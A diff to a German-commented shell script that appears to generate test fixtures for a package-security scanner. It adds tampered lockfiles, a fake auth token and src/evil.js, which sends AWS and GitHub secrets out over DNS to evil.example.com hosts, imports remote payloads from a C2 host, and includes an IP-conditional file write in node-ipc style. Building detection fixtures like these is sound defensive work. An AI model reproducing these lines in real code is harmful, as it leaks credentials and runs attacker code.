@@ -88,7 +88,8 @@ YARNRCYML
 
 # -------------------------------------------------------------------
 # 5. package-lock.json
-#    Triggert: SUPPLY_CHAIN (aufgeloeste URL zeigt auf Nicht-Standard-Registry)
+#    Triggert: SUPPLY_CHAIN (aufgeloeste URL zeigt auf Nicht-Standard-Registry),
+#              SUPPLY_CHAIN MEDIUM (tampered-pkg ohne integrity-Hash)
 # -------------------------------------------------------------------
 cat > package-lock.json << 'LOCKJSON'
 {
@@ -107,13 +108,47 @@ cat > package-lock.json << 'LOCKJSON'
       "version": "1.0.0",
       "resolved": "https://evil-registry.example.com/npm/evil-backdoor-1.0.0.tgz",
       "integrity": "sha512-FAKEFAKEFAKE"
+    },
+    "node_modules/tampered-pkg": {
+      "version": "2.0.0",
+      "resolved": "https://registry.npmjs.org/tampered-pkg/-/tampered-pkg-2.0.0.tgz"
     }
   }
 }
 LOCKJSON
 
 # -------------------------------------------------------------------
-# 6. binding.gyp
+# 6. pnpm-lock.yaml
+#    Triggert: SUPPLY_CHAIN (Non-Standard-tarball-URL, Registry-Override),
+#              EXFILTRATION (hardcodierter Auth-Token)
+# -------------------------------------------------------------------
+cat > pnpm-lock.yaml << 'PNPMLOCK'
+lockfileVersion: '9.0'
+
+settings:
+  autoInstallPeers: true
+  excludeLinksFromLockfile: false
+
+# Registry-Override auf Nicht-Standard-Registry
+npmRegistryServer: https://evil-registry.example.com/pnpm/
+
+# Hardcodierter Auth-Token
+authToken: fake_pnpm_token_0123456789abcdef
+
+packages:
+  lodash@4.17.21:
+    resolution:
+      integrity: sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZkFekkHGmh7M1Rb68Rg==
+      tarball: https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz
+
+  evil-package@1.0.0:
+    resolution:
+      integrity: sha512-FAKEFAKEFAKE
+      tarball: https://evil-registry.example.com/npm/evil-package-1.0.0.tgz
+PNPMLOCK
+
+# -------------------------------------------------------------------
+# 7. binding.gyp
 #    Triggert: INSTALL_SCRIPT MEDIUM (impliziter node-gyp-Hook),
 #              INSTALL_SCRIPT HIGH (curl in Action),
 #              INSTALL_SCRIPT HIGH (nc/netcat in Action)
@@ -142,11 +177,12 @@ cat > binding.gyp << 'BINDINGYP'
 BINDINGYP
 
 # -------------------------------------------------------------------
-# 7. src/evil.js
+# 8. src/evil.js
 #    Triggert alle CODE_THREAT_RULES-Kategorien:
-#    OBFUSCATION (HIGH/MEDIUM/LOW), EXFILTRATION (HIGH/MEDIUM),
-#    FILESYSTEM_ATTACK (HIGH/MEDIUM), REMOTE_EXEC (HIGH/MEDIUM),
-#    CRYPTOMINING (HIGH/MEDIUM), SUPPLY_CHAIN (HIGH/MEDIUM/LOW)
+#    OBFUSCATION (inkl. dynamic import split-Pfad MEDIUM),
+#    EXFILTRATION (inkl. DNS-Exfiltration HIGH + Co-Occurrence MEDIUM),
+#    FILESYSTEM_ATTACK, REMOTE_EXEC (inkl. dynamic import HIGH),
+#    CRYPTOMINING, SUPPLY_CHAIN (inkl. node-ipc IP-Conditional HIGH)
 # -------------------------------------------------------------------
 mkdir -p src
 cat > src/evil.js << 'EVILJS'
@@ -258,6 +294,42 @@ const miningLib = 'https://coinhive.com/lib/coinhive.min.js';
 // MEDIUM: Mining-Algorithmusname
 const algorithm = 'CryptoNight';
 
+// ── DNS EXFILTRATION ─────────────────────────────────────────────────────────
+
+// HIGH: dns.resolve mit process.env-basiertem Hostnamen (kodiert als Hex)
+const dns = require('dns');
+dns.resolve(Buffer.from(process.env.AWS_SECRET_ACCESS_KEY).toString('hex') + '.exfil.evil.example.com');
+
+// HIGH: dns.lookup mit dynamisch zusammengesetztem Hostnamen (String-Konkatenation)
+const _leaked = Buffer.from(process.env.GITHUB_TOKEN, 'utf8').toString('base64');
+dns.lookup(_leaked + '.exfil.evil.example.com', () => {});
+
+// MEDIUM (Co-Occurrence): dns-Modul + process.env in derselben Datei (bereits durch die Zeilen oben gegeben)
+
+// ── IP-CONDITIONAL (node-ipc-Stil 2022) ──────────────────────────────────────
+
+// HIGH: externer IP-Ermittlungsdienst — node-ipc-Muster
+fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => {
+  const ip = data.ip;
+  // HIGH: IP-Praefix-Pruefung gegen Zahlenliteral
+  if (ip.startsWith('5.') || ip.startsWith('195.')) {
+    // Co-Occurrence: IP-Quelle + destruktive FS-Operation in derselben Datei
+    fs.writeFile('/tmp/target', '♥ fuck war, no war', () => {});
+  }
+});
+
+// ── DYNAMIC IMPORT ───────────────────────────────────────────────────────────
+
+// HIGH: dynamisches import() mit absoluter Remote-URL
+import('https://evil.example.com/payload.js');
+
+// HIGH: dynamisches import() mit Netzwerk-Aufruf als Argument
+import(fetch('https://c2.evil.example.com/mod').then(r => r.text()));
+
+// MEDIUM: dynamisches import() mit zusammengesetztem Pfad (verschleierter Modulname)
+const _base = 'evil-mod';
+import(_base + '/index.js');
+
 // ── SUPPLY_CHAIN ─────────────────────────────────────────────────────────────
 
 // HIGH: Module._compile mit verschluesseltem Inhalt (Event-Stream-Stil)
@@ -277,7 +349,7 @@ EVILJS
 python3 -c "print(\"var _min='\" + 'a'*1050 + \"';\")" >> src/evil.js
 
 # -------------------------------------------------------------------
-# 8. src/native_addon.node
+# 9. src/native_addon.node
 #    Triggert: SUPPLY_CHAIN MEDIUM (nicht analysierbarer Nativer Code)
 # -------------------------------------------------------------------
 printf '\x7fELF\x02\x01\x01\x00' > src/native_addon.node
